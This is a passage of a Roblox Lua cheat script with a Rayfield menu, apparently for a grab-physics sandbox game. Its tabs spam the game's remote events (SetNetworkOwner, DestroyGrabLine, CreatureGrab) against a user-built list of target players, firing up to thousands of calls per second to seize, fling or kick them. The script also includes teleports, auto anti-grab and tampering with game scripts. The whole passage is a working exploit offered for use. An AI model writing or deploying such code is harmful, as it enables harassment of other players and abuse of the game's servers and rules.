        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if char and hrp and RagdollRemote then
            pcall(function() RagdollRemote:FireServer(hrp, 0) end)
        end
        task.wait()
    end
    plotRagdollLoopD = false
end
 
local function sitOnBlob(blob)
    if not blob then return false end
 
    local char = game.Players.LocalPlayer.Character
    if not char then return false end
 
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return false end
 
    local seat = blob:FindFirstChild("VehicleSeat") or blob:FindFirstChildWhichIsA("VehicleSeat")
    if not seat then return false end
 
    if seat.Occupant == hum then return true end
 
    local success = pcall(function() seat:Sit(hum) end)
    return success
end
 
-- ===== Auto Cleanup function (execute together every House Gucci cycle) =====
local function AutoCleanup()
    pcall(function()
        -- Delete GrabParts
        local grabParts = workspace:FindFirstChild("GrabParts")
        if grabParts then
            grabParts:Destroy()
        end
 
        -- Delete CamPart
        local camPart = workspace:FindFirstChild("CamPart")
        if camPart then
            camPart:Destroy()
        end
 
        -- Toggle GrabbingScript off and on
        local grabScript = nil
        for _, v in ipairs(workspace:GetDescendants()) do
            if v.Name == "GrabbingScript" and v:IsA("Script") then
                grabScript = v
                break
            end
        end
 
        if grabScript then
            grabScript.Disabled = true
            task.wait(0.1)
            grabScript.Disabled = false
        end
    end)
end
-- ===== Auto Cleanup End =====
 
local function plotGucciLoop()
    while PlotGucciT do
        local success = pcall(function()
            local blob = findBlob()
 
            if not blob then
                blob = spawnBlobInPlot()
            end
 
            if not blob then
                task.wait(2)
                return
            end
 
            local char = game.Players.LocalPlayer.Character
            if not char then
                task.wait(0.5)
                return
            end
 
            local hrp = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChild("Humanoid")
            if not hrp or not hum then return end
 
            local rag = hum:FindFirstChild("Ragdolled")
            local held = game.Players.LocalPlayer:FindFirstChild("IsHeld")
 
            local originalCF = hrp.CFrame
            local sat = sitOnBlob(blob)
 
            if sat then
                plotSitJumpT = true
                task.spawn(plotRagdollLoop)
                task.wait(0.3)
                hrp.CFrame = originalCF
 
                local startTime = tick()
                while PlotGucciT and tick() - startTime < 10 do
                    if hum.Health <= 0 then break end
 
                    local seat = blob:FindFirstChildWhichIsA("VehicleSeat")
                    if not seat or seat.Occupant ~= hum then break end
 
                    if rag and rag.Value == true and Struggle then Struggle:FireServer() end
                    if held and held.Value == true and Struggle then Struggle:FireServer() end
 
                    task.wait(0.5)
                end
 
                plotSitJumpT = false
            end
        end)
 
        -- ===== Execute cleanup after each House Gucci cycle =====
        AutoCleanup()
 
        task.wait(1)
    end
    plotSitJumpT = false
end
 
local PlotGucciToggle = GucciTab:CreateToggle({
    Name = "🏠 House Gucci (Auto Cleanup included)",
    CurrentValue = false,
    Callback = function(Value)
        PlotGucciT = Value
 
        if Value then
            if not RagdollRemote then
                Rayfield:Notify({ Title = "❌ Error", Content = "RagdollRemote None", Duration = 2 })
                PlotGucciToggle:Set(false)
                return
            end
 
            if plotGucciThread then task.cancel(plotGucciThread) end
            plotGucciThread = task.spawn(plotGucciLoop)
 
            Rayfield:Notify({ Title = "🏠 House Gucci", Content = "Enabled + Auto Cleanup", Duration = 2 })
        else
            if plotGucciThread then task.cancel(plotGucciThread); plotGucciThread = nil end
            plotSitJumpT = false
            Rayfield:Notify({ Title = "🏠 House Gucci", Content = "Disabled", Duration = 2 })
        end
    end
})
 
GucciTab:CreateButton({
    Name = "🏠 Find Plot Blob",
    Callback = function()
        local blob = findBlob()
        if blob then
            local location = findBlobInPlot() and "Plot" or "Inventory"
            Rayfield:Notify({ Title = "✅ Found", Content = "Blob is in " .. location, Duration = 2 })
        else
            Rayfield:Notify({ Title = "❌ None", Content = "No Blob found", Duration = 2 })
        end
    end
})
 
GucciTab:CreateButton({
    Name = "🏠 Spawn Blob in Plot",
    Callback = function()
        local blob = spawnBlobInPlot()
        if blob then
            Rayfield:Notify({ Title = "✅ Spawned", Content = "Blob spawned in Plot", Duration = 2 })
        else
            Rayfield:Notify({ Title = "❌ Failed", Content = "Spawn failed (Plot required)", Duration = 2 })
        end
    end
})
 
GucciTab:CreateButton({
    Name = "📋 Check My Plot Number",
    Callback = function()
        local plotNum = getMyPlotNumber()
        if plotNum then
            Rayfield:Notify({ Title = "✅ Plot " .. plotNum, Content = "Your plot number", Duration = 2 })
        else
            Rayfield:Notify({ Title = "❌ None", Content = "No Plot found", Duration = 2 })
        end
    end
})
 
-- =============================================
-- [ Settings Tab ]
-- =============================================
SettingsTab:CreateSection("⚙️ Settings")
 
SettingsTab:CreateToggle({
    Name = "Hide UI",
    CurrentValue = true,
    Callback = function(Value)
        if _G and _G.ToggleUI then
            _G.ToggleUI = not Value
        end
    end
})
 
SettingsTab:CreateSection("⌨️ Hotkey Guide")
SettingsTab:CreateParagraph({ Title = "PC Hotkeys", Content = "Z key: Teleport in look direction" })
 
-- =============================================
-- [ SetOwnerKick Tab - Blob left-only grab and release ]
-- =============================================
if SetOwnerKickTab then
    pcall(function()
        SetOwnerKickTab:CreateSection("🎯 Target List")
 
        local SetOwnerKickT = false
        local setOwnerThread = nil
        local setOwnerTargetList = {}
        local setOwnerMode = "Up"
        local setOwnerTotalCalls = 0
 
        -- Blob grab and release variable (left only)
        local BlobGrabReleaseOnTouch = false
        local BlobGrabReleaseThread = nil
 
        local rs = game:GetService("ReplicatedStorage")
        local GrabEvents = rs:FindFirstChild("GrabEvents")
        local SetNetworkOwner = GrabEvents and (GrabEvents:FindFirstChild("SetNetworkOwner") or GrabEvents:FindFirstChild("SetOwner"))
        local DestroyGrabLine = GrabEvents and (GrabEvents:FindFirstChild("DestroyGrabLine") or GrabEvents:FindFirstChild("DestroyLine"))
 
        local function findPlayer(name)
            for _, p in ipairs(game.Players:GetPlayers()) do
                if p.Name:lower():find(name:lower()) or (p.DisplayName and p.DisplayName:lower():find(name:lower())) then
                    return p
                end
            end
            return nil
        end
 
        -- Teleport function
        local function TP(target)
            local TCHAR = target.Character
            local THRP = TCHAR and (TCHAR:FindFirstChild("Torso") or TCHAR:FindFirstChild("HumanoidRootPart"))
            local localChar = game.Players.LocalPlayer.Character
            local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")
 
            if TCHAR and THRP and localHRP then
                local ping = game.Players.LocalPlayer:GetNetworkPing()
                local offset = THRP.Position + (THRP.Velocity * (ping + 0.15))
                localHRP.CFrame = CFrame.new(offset) * THRP.CFrame.Rotation
                return true
            end
            return false
        end
 
        -- ===== Blob left-only grab and release function =====
        local function BlobLeftGrabAndRelease(blob, target)
            if not blob or not target then return end
 
            local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
            if not script then return end
 
            -- left only usage
            local leftDetector = blob:FindFirstChild("LeftDetector")
            if leftDetector then
                local leftWeld = leftDetector:FindFirstChild("LeftWeld")
                if leftWeld and script:FindFirstChild("CreatureGrab") and script:FindFirstChild("CreatureRelease") then
                    -- Grab from left
                    pcall(function() script.CreatureGrab:FireServer(leftDetector, target, leftWeld) end)
                    task.wait(0.001) -- Hold briefly
                    -- Release from left
                    pcall(function() script.CreatureRelease:FireServer(leftWeld, target) end)
                end
            end
        end
 
        -- ===== High-speed Blob check loop (execute every frame) =====
        local function StartBlobGrabReleaseLoop()
            if BlobGrabReleaseThread then
                task.cancel(BlobGrabReleaseThread)
                BlobGrabReleaseThread = nil
            end
 
            BlobGrabReleaseThread = task.spawn(function()
                while BlobGrabReleaseOnTouch do
                    local char = game.Players.LocalPlayer.Character
                    if char then
                        local hrp = char:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            -- Check all nearby Blobs
                            for _, blob in ipairs(workspace:GetDescendants()) do
                                if blob.Name == "CreatureBlobman" then
                                    local seat = blob:FindFirstChild("VehicleSeat")
                                    if seat then
                                        -- distance calculation (20 studs)
                                        local dist = (hrp.Position - seat.Position).Magnitude
                                        if dist < 20 then
                                            -- Process only players in Target List
                                            for _, targetName in ipairs(setOwnerTargetList) do
                                                local target = game.Players:FindFirstChild(targetName)
                                                if target and target.Character then
                                                    local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
                                                    if targetHRP then
                                                        -- Execute left-only grab and release
                                                        BlobLeftGrabAndRelease(blob, targetHRP)
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    task.wait() -- execute every frame
                end
            end)
        end
 
        local function wait018()
            local start = tick()
            while tick() - start < 0.018 and SetOwnerKickT do
                task.wait()
            end
        end
 
        local function setOwnerKickLoop()
            local isSetOwnerTurn = true
            setOwnerTotalCalls = 0
 
            while SetOwnerKickT do
                local targets = {}
                for _, name in ipairs(setOwnerTargetList) do
                    table.insert(targets, name)
                end
 
                for _, targetName in ipairs(targets) do
                    if not SetOwnerKickT then break end
 
                    pcall(function()
                        local target = game.Players:FindFirstChild(targetName)
                        if not target then return end
 
                        local myChar = game.Players.LocalPlayer.Character
                        local targetChar = target.Character
                        if not myChar or not targetChar then return end
 
                        local myHRP = myChar:FindFirstChild("HumanoidRootPart")
                        local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
                        local targetBody = targetChar:FindFirstChild("Torso") or targetChar:FindFirstChild("UpperTorso")
                        local cam = workspace.CurrentCamera
 
                        if not myHRP or not targetHRP or not cam then return end
 
                        -- distance calculation
                        local distance = (myHRP.Position - targetHRP.Position).Magnitude
 
                        -- if distance > 30 studs then TP
                        if distance > 30 then
                            TP(target)
                            wait018()
                        end
 
                        local detentionPos
                        if setOwnerMode == "Up" then
                            detentionPos = myHRP.CFrame * CFrame.new(0, 18, 0)
                        elseif setOwnerMode == "Down" then
                            detentionPos = myHRP.CFrame * CFrame.new(0, -10, 0)
                        else
                            detentionPos = cam.CFrame * CFrame.new(0, 0, -19)
                        end
 
                        if SetNetworkOwner and DestroyGrabLine then
                            if isSetOwnerTurn then
                                -- SetOwner 4 times
                                for i = 1, 15 do
                                    SetNetworkOwner:FireServer(targetHRP, detentionPos)
                                    setOwnerTotalCalls = setOwnerTotalCalls + 1
                                    if i == 15 then
                                        targetHRP.CFrame = detentionPos
                                        targetHRP.AssemblyLinearVelocity = Vector3.zero
                                    end
                                    if targetBody then
                                        SetNetworkOwner:FireServer(targetBody, detentionPos)
                                        setOwnerTotalCalls = setOwnerTotalCalls + 1
                                    end
                                end
                            else
                                -- Destroy 4 times
                                for i = 1,15 do
                                    DestroyGrabLine:FireServer(targetHRP)
                                    setOwnerTotalCalls = setOwnerTotalCalls + 1
                                    if i == 15 then
                                        targetHRP.CFrame = detentionPos
                                    end
                                    if targetBody then 
                                        DestroyGrabLine:FireServer(targetBody)
                                        setOwnerTotalCalls = setOwnerTotalCalls + 1
                                    end
                                end
                            end
                            isSetOwnerTurn = not isSetOwnerTurn
                        end
                    end)
                    wait018()
                end
            end
        end
 
        local setOwnerDropdown = SetOwnerKickTab:CreateDropdown({
            Name = "SetOwnerKick List",
            Options = setOwnerTargetList,
            CurrentOption = {"Open"},
            MultipleOptions = true,
            Callback = function(opt) setOwnerTargetList = opt end
        })
 
        SetOwnerKickTab:CreateInput({
            Name = "Add",
            PlaceholderText = "Nickname",
            RemoveTextAfterFocusLost = true,
            Callback = function(v)
                if v == "" then return end
                local p = findPlayer(v)
                if not p then 
                    Rayfield:Notify({ Title = "❌ None", Duration = 2 }) 
                    return 
                end
                for _, n in ipairs(setOwnerTargetList) do
                    if n == p.Name then 
                        Rayfield:Notify({ Title = "⚠️ Duplicate", Duration = 2 }) 
                        return 
                    end
                end
                table.insert(setOwnerTargetList, p.Name)
                setOwnerDropdown:Refresh(setOwnerTargetList, true)
                Rayfield:Notify({ Title = "✅ Add: " .. p.Name, Duration = 2 })
            end
        })
 
        SetOwnerKickTab:CreateInput({
            Name = "Remove",
            PlaceholderText = "Nickname",
            RemoveTextAfterFocusLost = true,
            Callback = function(v)
                for i, n in ipairs(setOwnerTargetList) do
                    if n:lower():find(v:lower()) then
                        table.remove(setOwnerTargetList, i)
                        setOwnerDropdown:Refresh(setOwnerTargetList, true)
                        Rayfield:Notify({ Title = "✅ Remove: " .. n, Duration = 2 })
                        return
                    end
                end
                Rayfield:Notify({ Title = "❌ None", Duration = 2 })
            end
        })
 
        SetOwnerKickTab:CreateButton({
            Name = "🗑️ Clear All",
            Callback = function()
                setOwnerTargetList = {}
                setOwnerDropdown:Refresh(setOwnerTargetList, true)
                Rayfield:Notify({ Title = "✅ clear", Duration = 2 })
            end
        })
 
        SetOwnerKickTab:CreateSection("⚙️ Mode Settings")
 
        local setOwnerModeDropdown = SetOwnerKickTab:CreateDropdown({
            Name = "Mode select",
            Options = {"Camera", "Up", "Down"},
            CurrentOption = {setOwnerMode},
            MultipleOptions = false,
            Callback = function(opt)
                setOwnerMode = opt[1]
                Rayfield:Notify({ Title = "Mode change", Content = setOwnerMode, Duration = 1 })
            end
        })
 
        -- Blob left-only grab-release toggle
        SetOwnerKickTab:CreateSection("🦠 Blob Settings")
 
        local blobLeftGrabReleaseToggle = SetOwnerKickTab:CreateToggle({
            Name = "Blob left-only grab and release",
            CurrentValue = false,
            Callback = function(v)
                BlobGrabReleaseOnTouch = v
                if v then
                    StartBlobGrabReleaseLoop()
                    Rayfield:Notify({ Title = "✅ Blob left ON", Content = "left-only grab and release", Duration = 2 })
                else
                    if BlobGrabReleaseThread then
                        task.cancel(BlobGrabReleaseThread)
                        BlobGrabReleaseThread = nil
                    end
                    Rayfield:Notify({ Title = "❌ Blob left OFF", Duration = 2 })
                end
            end
        })
 
        SetOwnerKickTab:CreateParagraph({
            Title = "📌 Blob Description",
            Content = "• Blob left-only grab and release ON sec\n• if touching Blob, grab from left only and release\n• right side not used"
        })
 
        SetOwnerKickTab:CreateSection("🎮 Execute")
 
        local setOwnerToggle = SetOwnerKickTab:CreateToggle({
            Name = "⚡ SetOwnerKick 4:4 Execute",
            CurrentValue = false,
            Callback = function(v)
                SetOwnerKickT = v
                if v then
                    if #setOwnerTargetList == 0 then
                        Rayfield:Notify({ Title = "❌ List None", Duration = 2 })
                        setOwnerToggle:Set(false)
                        return
                    end
                    if setOwnerThread then task.cancel(setOwnerThread) end
                    setOwnerThread = task.spawn(setOwnerKickLoop)
                    Rayfield:Notify({ Title = "⚡ Start (4Set/4Destroy)", Duration = 2 })
                else
                    if setOwnerThread then task.cancel(setOwnerThread); setOwnerThread = nil end
                    Rayfield:Notify({ Title = "⏹️ Stopped", Duration = 2 })
                end
            end
        })
 
        local setOwnerStatus = SetOwnerKickTab:CreateLabel("Status: Idle", 4483362458)
        local setOwnerCountLabel = SetOwnerKickTab:CreateLabel("Targets: 0", 4483362458)
        local setOwnerCallsLabel = SetOwnerKickTab:CreateLabel("Calls: 0 times", 4483362458)
        local blobStatusLabel = SetOwnerKickTab:CreateLabel("Blob Left: OFF", 4483362458)
 
        spawn(function()
            while true do
                if SetOwnerKickT then
                    setOwnerStatus:Set("Status: 🟢 4:4 spamming")
                    setOwnerCallsLabel:Set("Calls: " .. setOwnerTotalCalls .. " times")
                else
                    setOwnerStatus:Set("Status: ⚫ Idle")
                end
                setOwnerCountLabel:Set("Targets: " .. #setOwnerTargetList)
 
                if BlobGrabReleaseOnTouch then
                    blobStatusLabel:Set("Blob Left: 🟢 ON")
                else
                    blobStatusLabel:Set("Blob Left: ⚫ OFF")
                end
                task.wait(0.1)
            end
        end)
 
        SetOwnerKickTab:CreateParagraph({
            Title = "📌 Spec",
            Content = "• SetOwner 4 times → Destroy 4 times alternation\n• 0.018 seconds interval\n• Auto TP > 30 studs\n• Blob left-only grab and release"
        })
    end)
end
 
-- =============================================
-- [ Ultra-fast frame switching (per frame 50 times) ]
-- =============================================
if SetOwnerKickTab then
    pcall(function()
        SetOwnerKickTab:CreateSection("💥 Ultra-fast Frame Switching")
 
        local UltraKickT = false
        local ultraThread = nil
        local ultraTargetList = {}
        local ultraIsSetOwner = true
        local ultraTotalCalls = 0
        local ultraFrameCount = 0
 
        local rs = game:GetService("ReplicatedStorage")
        local GrabEvents = rs:FindFirstChild("GrabEvents")
        local SetNetworkOwner = GrabEvents and (GrabEvents:FindFirstChild("SetNetworkOwner") or GrabEvents:FindFirstChild("SetOwner"))
        local DestroyGrabLine = GrabEvents and (GrabEvents:FindFirstChild("DestroyGrabLine") or GrabEvents:FindFirstChild("DestroyLine"))
 
        local function findPlayer(name)
            for _, p in ipairs(game.Players:GetPlayers()) do
                if p.Name:lower():find(name:lower()) or (p.DisplayName and p.DisplayName:lower():find(name:lower())) then
                    return p
                end
            end
            return nil
        end
 
        -- Execute 50 times per frame
        local function ultraFrameLoop()
            ultraIsSetOwner = true
            ultraTotalCalls = 0
            ultraFrameCount = 0
 
            local connection = game:GetService("RunService").RenderStepped:Connect(function()
                if not UltraKickT then
                    connection:Disconnect()
                    return
                end
 
                ultraFrameCount = ultraFrameCount + 1
 
                if #ultraTargetList == 0 then return end
 
                -- Execute 50 times in one frame
                for rep = 1, 50 do
                    local targetName = ultraTargetList[(ultraFrameCount * rep) % #ultraTargetList + 1]
                    local target = game.Players:FindFirstChild(targetName)
                    if not target then break end
 
                    local myChar = game.Players.LocalPlayer.Character
                    local targetChar = target.Character
                    if not myChar or not targetChar then break end
 
                    local myHRP = myChar:FindFirstChild("HumanoidRootPart")
                    local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
                    local cam = workspace.CurrentCamera
 
                    if not myHRP or not targetHRP or not cam then break end
 
                    local detentionPos = cam.CFrame * CFrame.new(0, 0, -19)
 
                    if ultraIsSetOwner then
                        -- SetOwner 25times
                        for i = 1, 25 do
                            if SetNetworkOwner then
                                SetNetworkOwner:FireServer(targetHRP, detentionPos)
                                ultraTotalCalls = ultraTotalCalls + 1
                            end
                        end
                    else
                        -- Destroy 25times
                        for i = 1, 25 do
                            if DestroyGrabLine then
                                DestroyGrabLine:FireServer(targetHRP)
                                ultraTotalCalls = ultraTotalCalls + 1
                            end
                        end
                    end
 
                    ultraIsSetOwner = not ultraIsSetOwner
                end
            end)
 
            ultraThread = connection
        end
 
        local ultraDropdown = SetOwnerKickTab:CreateDropdown({
            Name = "Ultra-fast Target",
            Options = ultraTargetList,
            CurrentOption = {"Open"},
            MultipleOptions = true,
            Callback = function(opt) ultraTargetList = opt end
        })
 
        SetOwnerKickTab:CreateInput({
            Name = "Ultra-fast Add",
            PlaceholderText = "Nickname",
            RemoveTextAfterFocusLost = true,
            Callback = function(v)
                if v == "" then return end
                local p = findPlayer(v)
                if not p then 
                    Rayfield:Notify({ Title = "❌ None", Duration = 2 }) 
                    return 
                end
                for _, n in ipairs(ultraTargetList) do
                    if n == p.Name then 
                        Rayfield:Notify({ Title = "⚠️ Duplicate", Duration = 2 }) 
                        return 
                    end
                end
                table.insert(ultraTargetList, p.Name)
                ultraDropdown:Refresh(ultraTargetList, true)
                Rayfield:Notify({ Title = "✅ Add: " .. p.Name, Duration = 2 })
            end
        })
 
        SetOwnerKickTab:CreateInput({
            Name = "Ultra-fast Remove",
            PlaceholderText = "Nickname",
            RemoveTextAfterFocusLost = true,
            Callback = function(v)
                for i, n in ipairs(ultraTargetList) do
                    if n:lower():find(v:lower()) then
                        table.remove(ultraTargetList, i)
                        ultraDropdown:Refresh(ultraTargetList, true)
                        Rayfield:Notify({ Title = "✅ Remove: " .. n, Duration = 2 })
                        return
                    end
                end
                Rayfield:Notify({ Title = "❌ None", Duration = 2 })
            end
        })
 
        local ultraToggle = SetOwnerKickTab:CreateToggle({
            Name = "💥 Ultra-fast Experiment",
            CurrentValue = false,
            Callback = function(v)
                UltraKickT = v
                if v then
                    if #ultraTargetList == 0 then
                        Rayfield:Notify({ Title = "❌ No targets", Duration = 2 })
                        ultraToggle:Set(false)
                        return
                    end
                    if ultraThread and ultraThread.Disconnect then
                        ultraThread:Disconnect()
                    end
                    ultraFrameLoop()
                    Rayfield:Notify({ Title = "💥 Start (per frame 50times)", Duration = 2 })
                else
                    if ultraThread and ultraThread.Disconnect then
                        ultraThread:Disconnect()
                        ultraThread = nil
                    end
                    Rayfield:Notify({ Title = "⏹️ Stopped", Duration = 2 })
                end
            end
        })
 
        local ultraStatus = SetOwnerKickTab:CreateLabel("Status: Idle", 4483362458)
        local ultraAction = SetOwnerKickTab:CreateLabel("Action: SetOwner 25 times", 4483362458)
        local ultraCount = SetOwnerKickTab:CreateLabel("Calls: 0", 4483362458)
        local ultraSpeed = SetOwnerKickTab:CreateLabel("Speed: 0times/sec", 4483362458)
 
        -- Speed measurement
        local lastCount = 0
        local lastTime = tick()
 
        spawn(function()
            while true do
                if UltraKickT then
                    ultraStatus:Set("Status: 🟢 Ultra-fast")
                    ultraAction:Set("Action: " .. (ultraIsSetOwner and "SetOwner 25 times" or "Destroy 25 times"))
                    ultraCount:Set("Calls: " .. ultraTotalCalls)
 
                    local now = tick()
                    if now - lastTime >= 1 then
                        local speed = ultraTotalCalls - lastCount
                        ultraSpeed:Set("Speed: " .. speed .. "times/sec")
                        lastCount = ultraTotalCalls
                        lastTime = now
                    end
                else
                    ultraStatus:Set("Status: ⚫ Idle")
                end
                task.wait(0.1)
            end
        end)
 
        SetOwnerKickTab:CreateParagraph({
            Title = "💥 Spec",
            Content = "• per frame 50times Execute\n• 60FPS = 3,000times/sec\n• 120FPS = 6,000times/sec\n• SetOwner 25 times ↔ Destroy 25 times alternation"
        })
    end)
end
 
-- =============================================
-- [ SetOwnerKick (SetOwner Kick) - extracted from raw(2) ]
-- =============================================
 
-- SetOwnerKick variables
local SetOwnerKickT = false
local setOwnerThread = nil
local setOwnerTargetList = {}
local setOwnerMode = "Up"  -- Up, Down, Camera
local setOwnerTotalCalls = 0
local setOwnerFrame = true  -- true = SetOwner, false = Destroy
 
-- SetOwnerKick function
local function setOwnerKickLoop()
    setOwnerTotalCalls = 0
    setOwnerFrame = true
 
    local connection = game:GetService("RunService").RenderStepped:Connect(function()
        if not SetOwnerKickT then
            connection:Disconnect()
            return
        end
 
        if #setOwnerTargetList == 0 then return end
 
        -- Target rotation
        local targetName = setOwnerTargetList[(setOwnerTotalCalls % #setOwnerTargetList) + 1]
        local target = game.Players:FindFirstChild(targetName)
        if not target then return end
 
        local myChar = game.Players.LocalPlayer.Character
        local targetChar = target.Character
        if not myChar or not targetChar then return end
 
        local myHRP = myChar:FindFirstChild("HumanoidRootPart")
        local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
        local cam = workspace.CurrentCamera
 
        if not myHRP or not targetHRP or not cam then return end
 
        -- Determine Up position
        local detentionPos
        if setOwnerMode == "Up" then
            detentionPos = myHRP.CFrame * CFrame.new(0, 18, 0)
        elseif setOwnerMode == "Down" then
            detentionPos = myHRP.CFrame * CFrame.new(0, -10, 0)
        else
            detentionPos = cam.CFrame * CFrame.new(0, 0, -19)
        end
 
        -- Frame alternation Execute (SetOwner 10 times / Destroy 10 times)
        if setOwnerFrame then
            -- SetOwner 10 times
            for i = 1, 10 do
                if SetNetworkOwner then
                    SetNetworkOwner:FireServer(targetHRP, detentionPos)
                    setOwnerTotalCalls = setOwnerTotalCalls + 1
                end
            end
        else
            -- Destroy 10 times
            for i = 1, 10 do
                if DestroyGrabLine then
                    DestroyGrabLine:FireServer(targetHRP)
                    setOwnerTotalCalls = setOwnerTotalCalls + 1
                end
            end
        end
 
        setOwnerFrame = not setOwnerFrame
    end)
 
    setOwnerThread = connection
end
 
-- SetOwnerKick Create tabs
local SetOwnerKickTab = Window:CreateTab("⚡ SetOwnerKick", 0)
 
SetOwnerKickTab:CreateSection("🎯 Target List")
 
local setOwnerDropdown = SetOwnerKickTab:CreateDropdown({
    Name = "SetOwnerKick List",
    Options = setOwnerTargetList,
    CurrentOption = {"Open"},
    MultipleOptions = true,
    Callback = function(opt)
        setOwnerTargetList = opt
    end
})
 
SetOwnerKickTab:CreateInput({
    Name = "Add",
    PlaceholderText = "Nickname",
    RemoveTextAfterFocusLost = true,
    Callback = function(v)
        if v == "" then return end
 
        local function findPlayer(name)
            for _, p in ipairs(game.Players:GetPlayers()) do
                if p.Name:lower():find(name:lower()) or (p.DisplayName and p.DisplayName:lower():find(name:lower())) then
                    return p
                end
            end
            return nil
        end
 
        local p = findPlayer(v)
        if not p then
            Rayfield:Notify({ Title = "❌ None", Duration = 2 })
            return
        end
 
        for _, n in ipairs(setOwnerTargetList) do
            if n == p.Name then
                Rayfield:Notify({ Title = "⚠️ Duplicate", Duration = 2 })
                return
            end
        end
 
        table.insert(setOwnerTargetList, p.Name)
        setOwnerDropdown:Refresh(setOwnerTargetList, true)
        Rayfield:Notify({ Title = "✅ Add: " .. p.Name, Duration = 2 })
    end
})
 
SetOwnerKickTab:CreateInput({
    Name = "Remove",
    PlaceholderText = "Nickname",
    RemoveTextAfterFocusLost = true,
    Callback = function(v)
        for i, n in ipairs(setOwnerTargetList) do
            if n:lower():find(v:lower()) then
                table.remove(setOwnerTargetList, i)
                setOwnerDropdown:Refresh(setOwnerTargetList, true)
                Rayfield:Notify({ Title = "✅ Remove: " .. n, Duration = 2 })
                return
            end
        end
        Rayfield:Notify({ Title = "❌ None", Duration = 2 })
    end
})
 
SetOwnerKickTab:CreateButton({
    Name = "🗑️ Clear All",
    Callback = function()
        setOwnerTargetList = {}
        setOwnerDropdown:Refresh(setOwnerTargetList, true)
        Rayfield:Notify({ Title = "✅ clear", Duration = 2 })
    end
})
 
SetOwnerKickTab:CreateSection("⚙️ Mode Settings")
 
local setOwnerModeDropdown = SetOwnerKickTab:CreateDropdown({
    Name = "Mode select",
    Options = {"Camera", "Up", "Down"},
    CurrentOption = {setOwnerMode},
    MultipleOptions = false,
    Callback = function(opt)
        setOwnerMode = opt[1]
        Rayfield:Notify({ Title = "Mode change", Content = setOwnerMode, Duration = 1 })
    end
})
 
SetOwnerKickTab:CreateSection("🎮 Execute")
 
local setOwnerToggle = SetOwnerKickTab:CreateToggle({
    Name = "⚡ SetOwnerKick Execute",
    CurrentValue = false,
    Callback = function(v)
        SetOwnerKickT = v
 
        if v then
            if #setOwnerTargetList == 0 then
                Rayfield:Notify({ Title = "❌ List None", Duration = 2 })
                setOwnerToggle:Set(false)
                return
            end
 
            if setOwnerThread then
                if setOwnerThread.Disconnect then
                    setOwnerThread:Disconnect()
                end
            end
 
            setOwnerKickLoop()
            Rayfield:Notify({ Title = "⚡ Start (frame alternation)", Duration = 2 })
        else
            if setOwnerThread and setOwnerThread.Disconnect then
                setOwnerThread:Disconnect()
                setOwnerThread = nil
            end
            Rayfield:Notify({ Title = "⏹️ Stopped", Duration = 2 })
        end
    end
})
 
-- Status display
local setOwnerStatus = SetOwnerKickTab:CreateLabel("Status: Idle", 4483362458)
local setOwnerAction = SetOwnerKickTab:CreateLabel("Current Action: SetOwner", 4483362458)
local setOwnerCount = SetOwnerKickTab:CreateLabel("Calls: 0", 4483362458)
local setOwnerTargetCount = SetOwnerKickTab:CreateLabel("Targets: 0", 4483362458)
 
-- Real-time update
spawn(function()
    while true do
        if SetOwnerKickT then
            setOwnerStatus:Set("Status: 🟢 Executing")
            setOwnerAction:Set("current Action: " .. (setOwnerFrame and "SetOwner 10 times" or "Destroy 10 times"))
            setOwnerCount:Set("Calls: " .. setOwnerTotalCalls)
        else
            setOwnerStatus:Set("Status: ⚫ Idle")
        end
        setOwnerTargetCount:Set("Targets: " .. #setOwnerTargetList)
        task.wait(0.1)
    end
end)
 
SetOwnerKickTab:CreateParagraph({
    Title = "📌 Description",
    Content = "• SetOwner 10 times → Destroy 10 times alternation\n• RenderStepped use (per frame Execute)\n• Up Mode: head up(Y+18)\n• Target list cycle"
})
 
-- =============================================
-- [ Create TP button ]
-- =============================================
createTPButton()
 
-- =============================================
-- [ Auto Execute ]
-- =============================================
task.wait(1)
isAntiGrabEnabled = true
AntiGrabF(true)
AntiGrabToggle:Set(true)
 
setupKickNotifications()
setupBlobNotifications()
 
bringRayfieldToFront()
 
Rayfield:Notify({
    Title = "🚀 Load complete",
    Content = "SetOwnerKick tab included",
    Duration = 5
})
 
-- =============================================
-- [ Teleport includesnumber ]
-- =============================================
local function teleportTo(name, x, y, z)
    local char = plr.Character
    if not char then 
        Rayfield:Notify({Title = "Error", Content = "No character", Duration = 2})
        return 
    end
 
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then 
        Rayfield:Notify({Title = "Error", Content = "No HumanoidRootPart", Duration = 2})
        return 
    end
 
    hrp.CFrame = CFrame.new(x, y, z)
    Rayfield:Notify({ Title = "✅ Teleport", Content = name, Duration = 1 })
end
